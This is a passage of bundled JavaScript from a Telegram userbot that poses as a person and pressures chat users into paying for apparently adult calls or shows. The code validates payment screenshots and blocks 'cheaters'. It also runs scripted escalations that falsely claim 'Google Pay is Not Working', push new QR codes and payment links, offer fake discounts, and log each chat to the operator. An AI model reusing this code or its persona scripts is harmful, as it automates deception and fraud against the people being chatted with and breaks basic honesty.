                            }
                        }
                    }
                    else {
                        yield askToFinishPayment(event);
                    }
                }
            }
            else {
                if (sanitizedData.isPaymentMine) {
                    yield askToFinishPayment(event);
                }
                else {
                    const invalidPhotoCount = ((_g = invalidPhotosMap.get(chatId)) === null || _g === void 0 ? void 0 : _g.count) || 0;
                    if (invalidPhotoCount <= 4) {
                        yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: (0, messages_1.pickOneMsg)(['Nice', 'Loooks Goood', 'Wowww', 'yummmmm', 'awww']) }));
                        yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: (0, messages_1.pickOneMsg)(messages_1.messages.PayMsgArray) + '\n\n**Lets enjoy Now**' }));
                    }
                    else {
                        yield (0, utils_1.deleteMessage)(event);
                    }
                    const increment = imageDetails.isInappropriate ? 1 : 0;
                    invalidPhotosMap.set(chatId, { count: invalidPhotoCount + increment, time: Date.now() });
                }
            }
            yield event.message.markAsRead();
        }
        catch (error) {
            (0, parseError_1.parseError)(error, "Error Processing image");
        }
    });
}
function handleMyPayment(imageDetails, userDetails, isWithinPastTenMinutesImage, didPaidToOthers) {
    return __awaiter(this, void 0, void 0, function* () {
        var _a;
        const text = `${imageDetails.payeeName} ${imageDetails.payerName} ${imageDetails.text}`.toLowerCase();
        const db = dbservice_1.UserDataDtoCrud.getInstance();
        const otherclients = db.getClientFirstNames();
        const myNameExists = text.includes((_a = process.env.dbcoll) === null || _a === void 0 ? void 0 : _a.toLowerCase()) || text.includes(process.env.product);
        const othersNameExists = (0, inhandlerUpdated_1.contains)(text, otherclients);
        if (myNameExists) {
            //My payment, validate time
            return { isvalid: true, msg: '' };
        }
        else if (!myNameExists && !othersNameExists) {
            // could be anythingc validate time and did pay others
            if (!didPaidToOthers) {
                if (isWithinPastTenMinutesImage.result) {
                    return { isvalid: true, msg: '' };
                }
                else {
                    if (userDetails.videos.length > 1 && imageDetails.amount < 200) {
                        return { isvalid: false, msg: 'Seems Its **Old payment!!**\n\nPay now Again Baby!!😚😚' };
                    }
                    else {
                        return { isvalid: true, msg: '' };
                    }
                }
            }
            else {
                if (isWithinPastTenMinutesImage.result) {
                    return { isvalid: true, msg: '' };
                }
                else {
                    let message = '';
                    if (isWithinPastTenMinutesImage.isValid) {
                        message = `Its a old payment!!\n\n**Pay me Now again!!** and send me latest screenshot`;
                    }
                    else {
                        message = `Seems Its not my payment!!\n\nSend me Full screenshot of **My Payment** with **Payment Time** also, I will verify!!`;
                    }
                    yield sendMessageWithButton(`Told its suspicious!!, ${isWithinPastTenMinutesImage.time}`, 'Chat', `https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${userDetails.chatId}`);
                    return { isvalid: false, msg: message };
                }
            }
        }
        else if ((othersNameExists && !myNameExists)) {
            const updatedUserDetails = { limitTime: Date.now() + (30 * 60 * 1000) };
            yield db.update(userDetails.chatId, updatedUserDetails);
            yield sendMessageWithButton(`Told Not my payment!!\n${isWithinPastTenMinutesImage.time}`, 'Chat', `https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${userDetails.chatId}`);
            return { isvalid: false, msg: '**This not my Payment!!\nBye!!**' };
        }
    });
}
function askToFinishPayment(event) {
    return __awaiter(this, void 0, void 0, function* () {
        yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(event.chatId, { message: `${(0, messages_1.pickOneMsg)(['Hmm Yeah!!', 'Haa Yep..!!', 'Haaa yaa....!'])}\nFinish Payment and Send me **FULL Screenshot!!**` }));
        yield (0, utils_1.deleteMessage)(event);
        yield sendMessageWithButton(`Asked to finish Payment`, 'Chat', `https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${event.chatId.toString()}`);
    });
}
function forwardToChannel(event, channel) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            yield event.message.forwardTo(channel);
        }
        catch (error) {
            console.log("Falied to forward Message", error.errorMessage);
        }
    });
}
function forwardtoUnwanted(event) {
    return __awaiter(this, void 0, void 0, function* () {
        let forward = false;
        if (event.message.media instanceof telegram_1.Api.MessageMediaDocument) {
            const document = event.message.media.document.toJSON();
            const mimeType = document.mimeType.toLowerCase();
            console.log(mimeType);
            if (mimeType.includes('video') && !mimeType.includes('webm') && !mimeType.includes('sticker')) {
                forward = true;
            }
        }
        if (event.message.media instanceof telegram_1.Api.MessageMediaPhoto) {
            forward = true;
        }
        if (forward) {
            yield forwardToChannel(event, `@my_forwarder001_bot`);
        }
        yield (0, utils_1.deleteMessage)(event);
    });
}
function createOrUpdateEventsMap(event) {
    return __awaiter(this, void 0, void 0, function* () {
        const chatId = event.message.chatId.toString();
        if (!eventsMap.has(chatId)) {
            yield createNewChatEntry(chatId, event);
        }
        else {
            yield updateExistingChatEntry(chatId, event);
        }
    });
}
function respToFailedMSg(event, text, broadcastName) {
    return __awaiter(this, void 0, void 0, function* () {
        const chatId = event.message.chatId.toString();
        const failedCount = failedMap.get(chatId) || { count: 0, time: 0 };
        failedMap.set(chatId, { count: 1, time: Date.now() });
        yield event.client.sendMessage('@miscmessages', { message: `${broadcastName} : ${text} \n\nCount: ${failedCount.count}\nclientId: ${process.env.clientId}\n<a href='https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${event.chatId.toString()}'>ChatLink</a> `, parseMode: 'html', linkPreview: false });
        if (!(0, inhandlerUpdated_1.contains)(text, ['your money will be refund']) && (failedCount.count == 1 || Date.now() > failedCount.time + 40000)) {
            switch (failedCount.count) {
                case 1:
                    yield (0, Helpers_1.sleep)(2000);
                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `What is coming...?\n\n**Google Pay is Not Working!!**\nUse another App.` }));
                    yield (0, Helpers_1.sleep)(18000);
                    if ((0, inhandlerUpdated_1.contains)(text, ['link', 'webs'])) {
                        yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `NEW QR CODE - 1👆👆\n\nPay to this!!`, file: (0, common_1.getClientFilePath)('./QR1.jpg') }));
                    }
                    yield (0, Helpers_1.sleep)(18000);
                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `**PhonePe** se karo dear, Work karta he!!` }));
                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `**Which App do u use??**` }));
                    break;
                case 2:
                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `<b>Try with PayTm!!\n\n${messages_1.payLinks.paytm1}</b>`, parseMode: 'html', linkPreview: false }));
                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `NEW QR CODE - 1👆👆\n\nPay to this!!`, file: (0, common_1.getClientFilePath)('./QR1.jpg') }));
                    yield (0, Helpers_1.sleep)(18000);
                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `**PayTm** se karo dear, it is Working!!` }));
                    yield (0, Helpers_1.sleep)(18000);
                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `**Scan the QR Code from Other Mobile** instead of selecting QR screenshot from images, Then It will work!!\n\n\n**Use PhonePe!!**` }));
                    setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                        yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `Send me screenshot of Failed Payment dear!! What is coming for you??` }));
                        yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `**Do PhonePe or PayTm na???**` }));
                    }), 8000);
                    break;
                case 3:
                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `**send mee screenshot of Failed Payment!! Man**` }));
                    yield (0, Helpers_1.sleep)(18000);
                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `Pay with **PhonePe** or **PayTm**, I will give you **10Rs Discount!!**` }));
                    setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                        yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `<b>Oye....!!\n\n\nNEW WORKING</b> Links..!!👇👇\n\n${messages_1.payLinks.paytm3} - Working\n${messages_1.payLinks.phonepe2} - Working\n${messages_1.payLinks.gpay1}1 - Doubt (Try Once)\n${messages_1.payLinks.gpay2}2 - Doubt (Try Once)\n\nUse<b>"PhonePe / PayTm"  ONLY!!</b>✅✅`, parseMode: 'html', linkPreview: false }));
                    }), 14000);
                    break;
                default:
                    yield (0, Helpers_1.sleep)(5000);
                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `Send me the <b>Screenshot</b> of <b>Failed</b> Payment first!!\n<b>What is coming...??</b>\n\nUse <b>"PhonePe / PayTm"  ONLY!!✅✅</b>`, parseMode: "html" }));
                    yield (0, Helpers_1.sleep)(18000);
                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `Pay with **PhonePe** or **PayTm**, I will give you **10Rs Discount!!**` }));
                    const index = (0, utils_1.selectRandomElements)(['1', '2'], 1)[0];
                    setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                        yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `NEW QR CODE - ${index}👆👆\n\nPay to this!!`, file: (0, common_1.getClientFilePath)(`./QR${index}.jpg`) }));
                    }), 15000);
                    break;
            }
        }
        else {
            yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `**Google Pay is Not Working!!**\nUse another App.\n\nTry with **PhonePe/PayTm Babyyy!!😚😚**` }));
            const index = (0, utils_1.selectRandomElements)(['1', '2'], 1)[0];
            yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `NEW QR CODE - ${index}👆👆\n\nPay to this!!`, file: (0, common_1.getClientFilePath)(`./QR${index}.jpg`) }));
        }
        failedMap.set(chatId, { count: failedCount.count + 1, time: Date.now() });
    });
}
function deleteCallRequest(chatId) {
    phoneCallQueue = phoneCallQueue.filter(item => item !== chatId);
    return true;
}
function isNotQuestionable(text) {
    return (text === '' || (!(0, inhandlerUpdated_1.contains)(text, ["?", "kya", "lakshmi", "your", "is this", "apk", 'idhena', 'is it']) || (0, inhandlerUpdated_1.contains)(text, ["sent money", "done", "check", "received", "switch", "on paytm"])));
}
function initiateCall(amount_1, userDetails_1) {
    return __awaiter(this, arguments, void 0, function* (amount, userDetails, reason = "Default") {
        var _a;
        const chatId = userDetails.chatId;
        const limitTime = Date.now() + (10 * 60 * 1000);
        if (amount >= 30 && userDetails.demoGiven == false) {
            amount = 50;
        }
        //BE Careful while Changing this
        userDetails.payAmount = amount;
        const updatedUserDetails = { callTime: userDetails.callTime, payAmount: amount, demoGiven: userDetails.demoGiven, secondShow: userDetails.secondShow, paidCount: 0, highestPayAmount: userDetails.highestPayAmount, cheatCount: userDetails.cheatCount, limitTime: limitTime, paidReply: false };
        yield db.update(chatId, updatedUserDetails);
        yield db.createOrUpdateStats(chatId, null, amount, true, userDetails.demoGiven, updatedUserDetails.paidReply, userDetails.secondShow, true);
        console.log("Call Initiated", userDetails.payAmount, userDetails.videos.length);
        if (userDetails.payAmount >= 30 && userDetails.callTime < Date.now() - 3 * 60 * 1000 &&
            ((userDetails.highestPayAmount >= 250 && userDetails.callTime < Date.now() - 2 * 60 * 60 * 1000) ||
                (!userDetails.demoGiven && userDetails.payAmount <= 70) ||
                (!userDetails.secondShow && userDetails.payAmount > 70 && userDetails.payAmount < 200) ||
                ((userDetails.highestPayAmount >= 50 && userDetails.fullShow < 2) ||
                    (userDetails.highestPayAmount >= 150 && userDetails.fullShow < 3) ||
                    (userDetails.highestPayAmount >= 250 && userDetails.fullShow < 4) ||
                    (userDetails.highestPayAmount >= 350 && userDetails.fullShow < 6) ||
                    (userDetails.highestPayAmount > 350 && userDetails.fullShow < 8)))) {
            try {
                yield (0, utils_1.setTyping)(userDetails.chatId);
                yield tgClass.getClient().sendMessage(userDetails.chatId, {
                    message: (0, utils_1.selectRandomElements)([
                        "Wait, I am Calling you!!",
                        "Wait Baby!! Checking",
                        "Wait, Calling",
                        "One minute Baby, Checking "
                    ], 1)[0]
                });
            }
            catch (error) {
            }
            yield sendMessageWithButton(`${reason} - CALL INITIATED - ${chatId} - ${amount}`, 'Chat', `https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${chatId}`);
            const type = userDetails.demoGiven ? ((userDetails === null || userDetails === void 0 ? void 0 : userDetails.secondShow) ? "3" : "2") : "1";
            try {
                yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${process.env.uptimebot}/requestCall?clientId=${(_a = process.env.clientId) === null || _a === void 0 ? void 0 : _a.toLowerCase()}&chatId=${chatId}&type=${type}`);
            }
            catch (error) {
                console.log('Cannot request Another call', error);
            }
            yield (0, Helpers_1.sleep)(3000);
            try {
                if (phoneCall !== undefined) {
                    yield requestCall(chatId);
                }
                else {
                    phoneCallQueue.push(chatId);
                    console.log("pushing to Queue", phoneCallQueue.length);
                }
            }
            catch (error) {
                console.log("Error in Call Request: ", error);
            }
        }
        else {
            yield sendMessageWithButton(`Limited to Call: ${process.env.clientId}\n\n\nChatId:${userDetails.chatId}\nAmount:${amount}\nPayAmount:${userDetails.payAmount}\nHighestAmount:${userDetails.highestPayAmount}`, 'Chat', `https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${chatId}`);
            yield (0, utils_1.asktoPayByEvent)(tgClass.getClient(), userDetails);
        }
    });
}
let processingPic = false;
let processingCount = 0;
function enqueuePicEvent(event) {
    return __awaiter(this, void 0, void 0, function* () {
        picEventsQueue.push(event);
        console.log("PicQLen: ", picEventsQueue.length, processingPic, processingCount);
        while (picEventsQueue.length > 0) {
            if (!processingPic) {
                processingPic = true;
                processingCount = 0;
                yield processNextPicEvent();
            }
            else {
                console.log("Empty Pic Queue: ", picEventsQueue.length);
                yield (0, Helpers_1.sleep)(5000);
                processingCount++;
                if (processingCount > 3) {
                    processingPic = false;
                    processingCount = 0;
                }
            }
        }
    });
}
function sendMessageWithButton(message, title, url) {
    return __awaiter(this, void 0, void 0, function* () {
        function escapeMarkdownV2(text) {
            text = text.replace(/([\\_`\[\]()~>`#+\-=|{}.!])/g, '\\$1');
            return text;
        }
        yield (0, fetchWithTimeout_1.fetchWithTimeout)((0, logbots_1.ppplbot)().split("?")[0], {
            method: "post",
            data: {
                chat_id: process.env.updatesChannel,
                text: escapeMarkdownV2(message.replace(/\*\*/g, '*')),
                parse_mode: 'MarkdownV2',
                reply_markup: JSON.stringify({
                    inline_keyboard: [
                        [
                            {
                                text: title,
                                url: url
                            }
                        ]
                    ]
                })
            }
        });
    });
}
function processNextPicEvent() {
    return __awaiter(this, void 0, void 0, function* () {
        const picEvent = picEventsQueue.shift();
        if (picEvent) {
            yield processImage(picEvent);
        }
        else {
            console.log("Undefined Pic Event");
        }
        console.log("proccesing Finished");
        processingPic = false;
    });
}


/***/ }),

/***/ "./src/inhandlerUpdated.ts":
/*!*********************************!*\
  !*** ./src/inhandlerUpdated.ts ***!
  \*********************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.eventPrint = eventPrint;
exports.liftLimit = liftLimit;
exports.setPayAm = setPayAm;
exports.setLimit = setLimit;
exports.resetDb = resetDb;
exports.contains = contains;
exports.containsAll = containsAll;
exports.startswith = startswith;
exports.isEqual = isEqual;
exports.respond = respond;
const dbservice_1 = __webpack_require__(/*! ./dbservice */ "./src/dbservice.ts");
const respondToMsgs_1 = __webpack_require__(/*! ./respondToMsgs */ "./src/respondToMsgs.ts");
const sendGreetings_1 = __webpack_require__(/*! ./sendGreetings */ "./src/sendGreetings.ts");
const utils_1 = __webpack_require__(/*! ./utils */ "./src/utils.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ./utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const logbots_1 = __webpack_require__(/*! ./utils/logbots */ "./src/utils/logbots.ts");
const parseError_1 = __webpack_require__(/*! ./utils/parseError */ "./src/utils/parseError.ts");
// Helper function for structured error logging
function logError(context, error, chatId, broadcastName) {
    return __awaiter(this, void 0, void 0, function* () {
        const errorMessage = (error === null || error === void 0 ? void 0 : error.message) || String(error);
        const errorDetails = {
            context,
            chatId,
            user: broadcastName,
            timestamp: new Date().toISOString(),
            error: errorMessage,
            stack: error === null || error === void 0 ? void 0 : error.stack
        };
        console.error('Error Details:', JSON.stringify(errorDetails, null, 2));
        yield (0, utils_1.broadcast)('ERROR', `${context}: ${errorMessage}`);
        (0, parseError_1.parseError)(error, context, true);
    });
}
function eventPrint(event, allMsg) {
    return __awaiter(this, void 0, void 0, function* () {
        var _a, _b, _c, _d, _e, _f, _g, _h;
        const context = {
            chatId: (_a = event === null || event === void 0 ? void 0 : event.chatId) === null || _a === void 0 ? void 0 : _a.toString(),
            messageId: (_b = event === null || event === void 0 ? void 0 : event.message) === null || _b === void 0 ? void 0 : _b.id,
            isPrivate: event === null || event === void 0 ? void 0 : event.isPrivate
        };
        if (!(event === null || event === void 0 ? void 0 : event.isPrivate)) {
            console.log('Skipping non-private message:', JSON.stringify(context));
            return;
        }
        const db = dbservice_1.UserDataDtoCrud.getInstance();
        const chatId = (_c = event === null || event === void 0 ? void 0 : event.chatId) === null || _c === void 0 ? void 0 : _c.toString();
        if (!chatId) {
            yield logError('Invalid Chat ID', new Error('Missing or invalid chat ID'), undefined, 'Unknown');
            return;
        }
        try {
            let userDetails = yield (db === null || db === void 0 ? void 0 : db.read(chatId));
            const senderJson = yield (0, utils_1.getSenderJson)(event);
            const broadcastName = (senderJson === null || senderJson === void 0 ? void 0 : senderJson.username) || (senderJson === null || senderJson === void 0 ? void 0 : senderJson.firstName) || 'Unknown';
            if (!senderJson) {
                yield logError('Failed to get sender info', new Error('getSenderJson returned null'), chatId, broadcastName);
            }
            yield (0, utils_1.broadcast)(`NewMessage: ${broadcastName}-${userDetails === null || userDetails === void 0 ? void 0 : userDetails.payAmount}`, allMsg);
            let textedClientCount = { count: 1, list: [], lastDay: [], lastHour: ['hi'] };
            if (!userDetails) {
                console.log(`Initializing new user: ${broadcastName} (${chatId})`);
                const initUserDetails = {
                    fullShow: 0,
                    callTime: 0,
                    cheatCount: 0,
                    highestPayAmount: 0,
                    videos: [],
                    picsSent: 0,
                    chatId,
                    totalCount: 1,
                    picCount: 0,
                    lastMsgTimeStamp: Date.now(),
                    limitTime: Date.now(),
                    paidCount: 0,
                    prfCount: 0,
                    canReply: 1,
                    payAmount: 0,
                    username: broadcastName,
                    accessHash: ((_d = senderJson === null || senderJson === void 0 ? void 0 : senderJson.accessHash) === null || _d === void 0 ? void 0 : _d.toString()) || '',
                    paidReply: true,
                    demoGiven: false,
                    secondShow: false,
                    profile: process.env.dbcoll || ''
                };
                userDetails = initUserDetails;
                yield db.create(Object.assign(Object.assign({}, initUserDetails), { limitTime: Date.now() + 20000 }));
                textedClientCount = yield db.textedClientCount(chatId);
            }
            else {
                try {
                    const updatedData = {
                        lastMsgTimeStamp: Date.now(),
                        totalCount: (userDetails.totalCount || 0) + 1,
                        accessHash: (_e = senderJson === null || senderJson === void 0 ? void 0 : senderJson.accessHash) === null || _e === void 0 ? void 0 : _e.toString()
                    };
                    const updatedUserDetails = yield db.update(chatId, updatedData);
                    if (!updatedUserDetails) {
                        yield logError('DB Update Failed', new Error('Update returned null'), chatId, broadcastName);
                        return;
                    }
                    userDetails = updatedUserDetails;
                    console.log(`Updated user data for ${broadcastName} (${chatId}): totalCount=${updatedData.totalCount}`);
                }
                catch (error) {
                    yield logError('DB Update Failed', error, chatId, broadcastName);
                    console.log("Resetting DB due to update error", error);
                    const initUserDetails = {
                        fullShow: 0,
                        callTime: 0,
                        cheatCount: 0,
                        highestPayAmount: 0,
                        videos: [],
                        picsSent: 0,
                        username: '',
                        chatId,
                        totalCount: 1,
                        picCount: 0,
                        lastMsgTimeStamp: Date.now(),
                        limitTime: Date.now(),
                        paidCount: 0,
                        prfCount: 0,
                        canReply: 1,
                        payAmount: 0,
                        accessHash: ((_f = senderJson === null || senderJson === void 0 ? void 0 : senderJson.accessHash) === null || _f === void 0 ? void 0 : _f.toString()) || '',
                        paidReply: true,
                        demoGiven: false,
                        secondShow: false,
                        profile: process.env.dbcoll || ''
                    };
                    yield db.create(initUserDetails);
                    userDetails = initUserDetails;
                }
            }
            const currentTime = Date.now();
            const limitTime = (userDetails === null || userDetails === void 0 ? void 0 : userDetails.limitTime) || 0;
            const isBot = broadcastName.toLowerCase().endsWith('bot');
            const totalCount = (userDetails === null || userDetails === void 0 ? void 0 : userDetails.totalCount) || 0;
            if (currentTime > limitTime && !isBot && totalCount < 100) {
                try {
                    const msgs = yield event.client.getMessages(event.chatId, { limit: 8 });
                    if (!msgs) {
                        yield logError('Failed to fetch messages', new Error('getMessages returned null'), chatId, broadcastName);
                        return;
                    }
                    const hasMyMsg = msgs.some(msg => (msg === null || msg === void 0 ? void 0 : msg.fromId) !== null);
                    if (!msgs || msgs['total'] < 2 || totalCount === 1 || (msgs.total < 6 && !hasMyMsg)) {
                        if (!(userDetails === null || userDetails === void 0 ? void 0 : userDetails.payAmount)) {
                            yield event.message.markAsRead();
                            yield (0, utils_1.setTyping)(chatId);
                            if (textedClientCount.count < 5) {
                                if (textedClientCount.lastDay.length > 3 || textedClientCount.lastHour.length > 2) {
                                    const reply = `SPAMMERNO \n@${process.env.clientId} - ${chatId}\nUser: ${broadcastName}\nTotalCount: ${textedClientCount.list.length}\nRecent: ${textedClientCount.count}\nTotal: ${textedClientCount.list}\nlastDay: ${textedClientCount.lastDay}\nlastHour: ${textedClientCount.lastHour}`;
                                    yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(reply)}`);
                                    const maxtime = Math.max(Math.min(textedClientCount.count - 2, Number.MAX_SAFE_INTEGER), 1);
                                    yield db.updateSingleKey(chatId, dbservice_1.user.limitTime, currentTime + (maxtime * 60 * 60 * 1000));
                                }
                                else {
                                    yield (0, sendGreetings_1.sendGreetings)(event, msgs, textedClientCount.lastHour.length > 1);
                                }
                            }
                            else {
                                yield db.updateSingleKey(chatId, dbservice_1.user.limitTime, (currentTime + (24 * 60 * 60 * 1000)));
                                const reply = `SPAMMER \n@${process.env.clientId} - ${chatId}\nUser: ${broadcastName}\nTotalCount: ${textedClientCount.list.length}\nRecent: ${textedClientCount.count}\nTotal: ${textedClientCount.list}\nlastDay: ${textedClientCount.lastDay}\nlastHour: ${textedClientCount.lastHour}`;
                                yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(reply)}`);
                            }
                        }
                        else {
                            yield (0, respondToMsgs_1.respondToMsgs)(event, allMsg);
                        }
                    }
                    else {
                        if (msgs['total'] > 6 && ((_g = msgs[0]) === null || _g === void 0 ? void 0 : _g.date) && ((_h = msgs[6]) === null || _h === void 0 ? void 0 : _h.date) && (msgs[0].date - msgs[6].date < 20)) {
                            yield (0, utils_1.broadcast)(broadcastName, "SPAMMING!!!");
                            setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                                yield db.updateSingleKey(chatId, dbservice_1.user.limitTime, currentTime + 35000);
                            }), 8000);
                        }
                        if ((userDetails === null || userDetails === void 0 ? void 0 : userDetails.canReply) !== 0) {
                            if (msgs['total'] > 3) {
                                yield (0, respondToMsgs_1.respondToMsgs)(event, allMsg);
                            }
                            else {
                                yield (0, utils_1.setTyping)(chatId);
                            }
                        }
                    }
                }
                catch (error) {
                    yield logError('Message Processing Error', error, chatId, broadcastName);
                }
            }
            else {
                console.log(`Skipping message processing: currentTime=${currentTime}, limitTime=${limitTime}, isBot=${isBot}, totalCount=${totalCount}`);
                yield (0, utils_1.broadcast)(broadcastName, `NOT REPLYING---LIMIT--${allMsg} || Limited:${currentTime < limitTime}`);
            }
        }
        catch (error) {
            yield logError('eventPrint Main Error', error, chatId, 'Unknown');
            console.error('Full event context:', JSON.stringify(context, null, 2));
            try {
                const data = yield (db === null || db === void 0 ? void 0 : db.read(chatId));
                console.log(`Attempting to reset user data for ${chatId}. Current data:`, JSON.stringify(data, null, 2));
                const initUserDetails = {
                    fullShow: 0,
                    callTime: 0,
                    cheatCount: 0,
                    highestPayAmount: 0,
                    videos: [],
                    picsSent: 0,
                    username: '',
                    chatId,
                    totalCount: 1,
                    picCount: 0,
                    lastMsgTimeStamp: Date.now(),
                    limitTime: Date.now(),
                    paidCount: 0,
                    prfCount: 0,
                    canReply: 1,
                    payAmount: 0,
                    accessHash: '',
                    paidReply: true,
                    demoGiven: false,
                    secondShow: false,
                    profile: process.env.dbcoll || ''
                };
                yield (db === null || db === void 0 ? void 0 : db.create(initUserDetails));
                console.log(`Successfully reset user data for ${chatId}`);
            }
            catch (innerError) {
                yield logError('Critical: Failed to reset user data', innerError, chatId, 'Unknown');
                console.error('Reset attempt failed with data:', JSON.stringify({ chatId, error: innerError }, null, 2));
            }
        }
    });
}
function liftLimit(chatId) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const db = dbservice_1.UserDataDtoCrud.getInstance();
            yield db.updateSingleKey(chatId, dbservice_1.user.limitTime, Date.now());
            console.log(`Successfully lifted limit for user ${chatId}`);
        }
        catch (error) {
            yield logError('Lift Limit Failed', error, chatId);
            throw error; // Propagate error to caller
        }
    });
}
function setPayAm(chatId, am) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const db = dbservice_1.UserDataDtoCrud.getInstance();
            yield db.updateSingleKey(chatId, dbservice_1.user.payAmount, am);
            console.log(`Successfully set payment amount ${am} for user ${chatId}`);
        }
        catch (error) {
            yield logError('Set Payment Amount Failed', error, chatId);
            throw error;
        }
    });
}
function setLimit(chatId, dur) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const db = dbservice_1.UserDataDtoCrud.getInstance();
            const newLimit = Date.now() + (dur * 60 * 1000);
            yield db.updateSingleKey(chatId, dbservice_1.user.limitTime, newLimit);
            console.log(`Successfully set limit for user ${chatId}, duration: ${dur} minutes, new limit: ${new Date(newLimit).toISOString()}`);
        }
        catch (error) {
            yield logError('Set Limit Failed', error, chatId);
            throw error;
        }
    });
}
function resetDb(chatId) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const db = dbservice_1.UserDataDtoCrud.getInstance();
            const data = yield db.read(chatId);
            console.log(`Current data for user ${chatId}:`, JSON.stringify(data, null, 2));
            const initUserDetails = {
                chatId: chatId,
                totalCount: 1,
                picCount: 0,
                lastMsgTimeStamp: Date.now(),
                limitTime: Date.now(),
                paidCount: 0,
                prfCount: 0,
                canReply: 1,
                payAmount: 0
            };
            yield db.update(chatId, initUserDetails);
            console.log(`Successfully reset database for user ${chatId}`);
        }
        catch (error) {
            yield logError('Reset Database Failed', error, chatId);
            throw error;
        }
    });
}
function contains(str, arr) {
    try {
        if (!str || !Array.isArray(arr) || arr.length === 0) {
            return false;
        }
        const lowerStr = str.toLowerCase();
        return arr.some(element => typeof element === 'string' && lowerStr.includes(element.toLowerCase()));
    }
    catch (error) {
        console.error('Contains Function Error:', {
            context: 'contains',
            input: { str, arr },
            error: (error === null || error === void 0 ? void 0 : error.message) || String(error)
        });
        return false;
    }
}
function containsAll(str, arr) {
    try {
        if (!str || !Array.isArray(arr) || arr.length === 0) {
            return false;
        }
        const lowerStr = str.toLowerCase();
        return arr.every(element => typeof element === 'string' && lowerStr.includes(element.toLowerCase()));
    }
    catch (error) {
        console.error('ContainsAll Function Error:', {
            context: 'containsAll',
            input: { str, arr },
            error: (error === null || error === void 0 ? void 0 : error.message) || String(error)
        });
        return false;
    }
}
function startswith(str, arr) {
    try {
        if (!str || !Array.isArray(arr) || arr.length === 0) {
            return false;
        }
        const lowerStr = str.toLowerCase();
        return arr.some(element => typeof element === 'string' && lowerStr.startsWith(element.toLowerCase()));
    }
    catch (error) {
        console.error('StartsWith Function Error:', {
            context: 'startswith',
            input: { str, arr },
            error: (error === null || error === void 0 ? void 0 : error.message) || String(error)
        });
        return false;
    }
}
function isEqual(str, arr) {
    try {
        if (!Array.isArray(arr) || arr.length === 0) {
            return false;
        }
        const lowerStr = (str === null || str === void 0 ? void 0 : str.toLowerCase()) || '';
        return arr.some(element => typeof element === 'string' && lowerStr === element.toLowerCase());
    }
    catch (error) {
        console.error('IsEqual Function Error:', {
            context: 'isEqual',
            input: { str, arr },
            error: (error === null || error === void 0 ? void 0 : error.message) || String(error)
        });
        return false;
    }
}
function respond(event, messages, isReply) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const peer = yield event.message.getSender();
            const db = dbservice_1.UserDataDtoCrud.getInstance();
            const totalMsgs = yield (db === null || db === void 0 ? void 0 : db.getSingleKey(event.message.chatId.toString(), dbservice_1.user.totalCount));
            let waitTime = undefined;
            if (totalMsgs && totalMsgs > 20) {
                waitTime = 3000;
            }
            try {
                if (messages.length > 0) {
                    if (isReply === true) {
                        (0, respondToMsgs_1.pushToReplies)(event, event.message.chatId.toString(), messages[0], undefined, event.message.id, waitTime);
                        //     await event.message.reply({ message: messages[0], linkPreview: true })
                        // } else {
                        //     await withTimeout(event.client.sendMessage(chatId,{ message: messages[0], linkPreview: true })
                    }
                    else {
                        (0, respondToMsgs_1.pushToReplies)(event, event.message.chatId.toString(), messages[0], undefined, undefined, waitTime);
                    }
                }
                else {
